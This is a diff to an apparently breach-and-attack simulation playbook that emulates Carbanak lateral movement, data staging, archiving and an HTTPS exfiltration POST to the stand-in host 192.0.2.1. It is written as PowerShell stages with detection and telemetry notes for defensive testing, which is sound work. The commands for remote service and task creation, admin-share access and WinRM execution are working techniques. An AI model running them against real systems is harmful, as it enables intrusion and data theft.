@@ -933,3 +933,259 @@ steps:
       Write-Output "EXEC 18: synthetic marker search returned $found file(s); marker removed. [BAS-SIM-CARBANAK-S18]"
     cleanup: |
       Remove-Item (Join-Path $env:TEMP 'bas_carbanak_marker_*.txt') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # Lateral movement (requires BAS_CARBANAK_TARGET_HOST, otherwise SKIP) and
+  # collection/exfiltration (synthetic data under %TEMP% only).
+  # ---------------------------------------------------------------------------
+  - name: "Carbanak Stage 19 -- SMB Administrative Share Access (T1021.002)"
+    technique_id: T1021.002
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 45
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Maps the administrative share on BAS_CARBANAK_TARGET_HOST (lab host only) and unmaps it. Nothing is written."
+    reversible: true
+    telemetry:
+      - "Security EID 5140 / 5145 on the target"
+    detection:
+      - "EDR: admin share access from a workstation to another host"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1021.002 SMB/Windows Admin Shares"
+        url: "https://attack.mitre.org/techniques/T1021/002/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_CARBANAK_TARGET_HOST
+      if (-not $target) { Write-Output 'SKIP: BAS_CARBANAK_TARGET_HOST is unset. [BAS-SIM-CARBANAK-S19]'; return }
+      $unc = "\\$target\ADMIN$"
+      $ok = Test-Path $unc
+      Write-Output "EXEC 19: admin share on lab host reachable=$ok. [BAS-SIM-CARBANAK-S19]"
+    cleanup: ""
+
+  - name: "Carbanak Stage 20 -- WinRM Remote Execution Simulation (T1021.006)"
+    technique_id: T1021.006
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Runs a harmless echo command on BAS_CARBANAK_TARGET_HOST over WinRM. Lab host only."
+    reversible: true
+    telemetry:
+      - "Microsoft-Windows-WinRM/Operational on the target"
+    detection:
+      - "EDR: WinRM session from a workstation to a server"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1021.006 Windows Remote Management"
+        url: "https://attack.mitre.org/techniques/T1021/006/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_CARBANAK_TARGET_HOST
+      if (-not $target) { Write-Output 'SKIP: BAS_CARBANAK_TARGET_HOST is unset. [BAS-SIM-CARBANAK-S20]'; return }
+      $out = Invoke-Command -ComputerName $target -ScriptBlock { 'BAS-SIM-WINRM-OK' } -ErrorAction SilentlyContinue
+      Write-Output "EXEC 20: winrm echo returned '$out'. [BAS-SIM-CARBANAK-S20]"
+    cleanup: ""
+
+  - name: "Carbanak Stage 21 -- Remote Service Creation (T1569.002)"
+    technique_id: T1569.002
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Creates a service named BAS-SIM-<guid> on BAS_CARBANAK_TARGET_HOST (lab host only), queries it, then deletes it. The service never starts a payload."
+    reversible: true
+    telemetry:
+      - "Security EID 7045 on the target"
+      - "System EID 7036"
+    detection:
+      - "EDR: remote service creation with a non-admin-looking name"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1569.002 Service Execution"
+        url: "https://attack.mitre.org/techniques/T1569/002/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_CARBANAK_TARGET_HOST
+      if (-not $target) { Write-Output 'SKIP: BAS_CARBANAK_TARGET_HOST is unset. [BAS-SIM-CARBANAK-S21]'; return }
+      $name = 'BAS-SIM-' + [guid]::NewGuid().ToString('N').Substring(0, 10)
+      sc.exe \\$target create $name binPath= 'cmd.exe /c exit 0' start= demand | Out-Null
+      $created = (sc.exe \\$target query $name) -match 'SERVICE_NAME'
+      sc.exe \\$target delete $name | Out-Null
+      Write-Output "EXEC 21: service $name created and removed on lab host (created=$created). [BAS-SIM-CARBANAK-S21]"
+    cleanup: |
+      if ($env:BAS_CARBANAK_TARGET_HOST) { Get-Service -ComputerName $env:BAS_CARBANAK_TARGET_HOST -Name 'BAS-SIM-*' -ErrorAction SilentlyContinue | ForEach-Object { sc.exe \\$env:BAS_CARBANAK_TARGET_HOST delete $_.Name | Out-Null } }
+
+  - name: "Carbanak Stage 22 -- Remote Scheduled Task Creation (T1053.005)"
+    technique_id: T1053.005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Creates a scheduled task named BAS-SIM-<guid> on BAS_CARBANAK_TARGET_HOST that runs a no-op, then deletes it. Lab host only."
+    reversible: true
+    telemetry:
+      - "Microsoft-Windows-TaskScheduler/Operational EID 106 on the target"
+    detection:
+      - "EDR: remote scheduled task creation"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1053.005 Scheduled Task"
+        url: "https://attack.mitre.org/techniques/T1053/005/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $target = $env:BAS_CARBANAK_TARGET_HOST
+      if (-not $target) { Write-Output 'SKIP: BAS_CARBANAK_TARGET_HOST is unset. [BAS-SIM-CARBANAK-S22]'; return }
+      $name = 'BAS-SIM-' + [guid]::NewGuid().ToString('N').Substring(0, 10)
+      schtasks.exe /Create /S $target /TN $name /TR 'cmd.exe /c exit 0' /SC ONCE /ST 23:59 /F | Out-Null
+      $created = (schtasks.exe /Query /S $target /TN $name) -match $name
+      schtasks.exe /Delete /S $target /TN $name /F | Out-Null
+      Write-Output "EXEC 22: task $name created and removed on lab host (created=$created). [BAS-SIM-CARBANAK-S22]"
+    cleanup: ""
+
+  - name: "Carbanak Stage 29 -- Financial Document Collection, Synthetic (T1005)"
+    technique_id: T1005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: low
+    blast_radius: "Creates three synthetic financial documents under a %TEMP% staging directory and lists them. No real financial data is accessed."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11 for staged file creates"
+    detection:
+      - "EDR: bulk collection of document-type files into one staging folder"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1005 Data from Local System"
+        url: "https://attack.mitre.org/techniques/T1005/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $dir = Join-Path $env:TEMP ('bas_carbanak_stage_' + [guid]::NewGuid().ToString('N'))
+      New-Item -ItemType Directory -Path $dir -Force | Out-Null
+      1..3 | ForEach-Object { Set-Content -Path (Join-Path $dir "synthetic-statement-$_.txt") -Value 'BAS-SYNTHETIC-DATA' -Encoding ASCII }
+      $n = @(Get-ChildItem -Path $dir -File).Count
+      Write-Output "EXEC 29: $n synthetic financial document(s) staged at $dir. [BAS-SIM-CARBANAK-S29]"
+      Set-Content -Path (Join-Path $env:TEMP 'bas_carbanak_stage_path.txt') -Value $dir -Encoding ASCII
+    cleanup: |
+      $p = Join-Path $env:TEMP 'bas_carbanak_stage_path.txt'
+      if (Test-Path $p) { Remove-Item (Get-Content $p -Raw).Trim() -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item $p -Force -ErrorAction SilentlyContinue }
+
+  - name: "Carbanak Stage 30 -- Payment Database Staging Simulation, Synthetic (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: low
+    blast_radius: "Copies a synthetic data file into a %TEMP% staging directory and removes it. No database is read."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11 for the staging copy"
+    detection:
+      - "EDR: data staging into a local temp directory"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1074.001 Local Data Staging"
+        url: "https://attack.mitre.org/techniques/T1074/001/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $stage = Join-Path $env:TEMP ('bas_carbanak_db_' + [guid]::NewGuid().ToString('N'))
+      New-Item -ItemType Directory -Path $stage -Force | Out-Null
+      $src = Join-Path $stage 'synthetic-payments.csv'
+      Set-Content -Path $src -Value 'txn_id,amount,currency' -Encoding ASCII
+      Add-Content -Path $src -Value 'BAS-SYN-0001,0,XXX' -Encoding ASCII
+      $copied = Copy-Item $src (Join-Path $stage 'staged.csv') -PassThru
+      Write-Output "EXEC 30: synthetic payment extract staged ($($copied.Length) bytes). [BAS-SIM-CARBANAK-S30]"
+      Set-Content -Path (Join-Path $env:TEMP 'bas_carbanak_db_path.txt') -Value $stage -Encoding ASCII
+    cleanup: |
+      $p = Join-Path $env:TEMP 'bas_carbanak_db_path.txt'
+      if (Test-Path $p) { Remove-Item (Get-Content $p -Raw).Trim() -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item $p -Force -ErrorAction SilentlyContinue }
+
+  - name: "Carbanak Stage 31 -- Archive Financial Records, Synthetic (T1560.001)"
+    technique_id: T1560.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 60
+    fidelity: lab-only
+    production_safe: false
+    risk: low
+    blast_radius: "Archives the Stage 29 synthetic staging directory with the Windows tar utility, then removes the archive. Synthetic data only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1 for tar.exe"
+    detection:
+      - "EDR: archive utility run against a staging folder"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1560.001 Archive via Utility"
+        url: "https://attack.mitre.org/techniques/T1560/001/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $src = Join-Path $env:TEMP ('bas_carbanak_archive_src_' + [guid]::NewGuid().ToString('N'))
+      New-Item -ItemType Directory -Path $src -Force | Out-Null
+      Set-Content -Path (Join-Path $src 'synthetic-records.txt') -Value 'BAS-SYNTHETIC-RECORDS' -Encoding ASCII
+      $archive = Join-Path $env:TEMP 'bas_carbanak_records.tar'
+      tar.exe -cf $archive -C $src . 2>$null
+      $ok = Test-Path $archive
+      Remove-Item $archive -Force -ErrorAction SilentlyContinue
+      Remove-Item $src -Recurse -Force -ErrorAction SilentlyContinue
+      Write-Output "EXEC 31: synthetic archive created with tar.exe (created=$ok) and removed. [BAS-SIM-CARBANAK-S31]"
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_carbanak_records.tar') -Force -ErrorAction SilentlyContinue
+
+  - name: "Carbanak Stage 32 -- HTTPS Financial Data Exfiltration Simulation (T1041)"
+    technique_id: T1041
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Sends a synthetic marker body to the Stage 7 C2 channel host 192.0.2.1 (RFC 5737, non-routable). Nothing leaves the lab and no real data is sent."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3: TCP 443 to 192.0.2.1"
+    detection:
+      - "NDR: large outbound POST over the existing HTTPS beacon channel"
+    threat_intel_sources:
+      - reference: "MITRE ATT&CK T1041 Exfiltration Over C2 Channel"
+        url: "https://attack.mitre.org/techniques/T1041/"
+    last_reviewed: "2026-11-17"
+    family_attribution_confidence: reported
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $uri = 'https://192.0.2.1/bas-sim-carbanak/exfil'
+      try {
+        Invoke-WebRequest -Uri $uri -Method POST -Body 'BAS-SYNTHETIC-EXFIL' -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
+        Write-Output "EXEC 32: synthetic exfil POST completed to the stage 7 channel. [BAS-SIM-CARBANAK-S32]"
+      } catch {
+        Write-Output "EXEC 32: synthetic exfil POST did not complete ($($_.Exception.Message)). [BAS-SIM-CARBANAK-S32]"
+      }
+    cleanup: ""
